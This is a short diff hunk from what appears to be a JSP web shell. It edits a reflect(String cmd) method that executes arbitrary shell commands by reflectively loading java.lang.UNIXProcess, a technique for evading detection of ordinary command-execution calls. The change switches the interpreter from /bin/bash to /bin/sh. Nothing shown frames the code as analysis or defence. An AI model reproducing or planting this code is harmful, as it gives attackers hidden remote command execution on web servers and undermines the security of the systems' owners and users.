@@ -5,7 +5,7 @@
 <%!
     public static InputStream reflect(String cmd) throws Exception {
         InputStream inputStream = null;
-        String[] strs = new String[]{"/bin/bash", "-c", cmd};
+        String[] strs = new String[]{"/bin/sh", "-c", cmd};
         Class<?> processClass = null;
         try {
             processClass = Class.forName("java.lang.UNIXProcess");
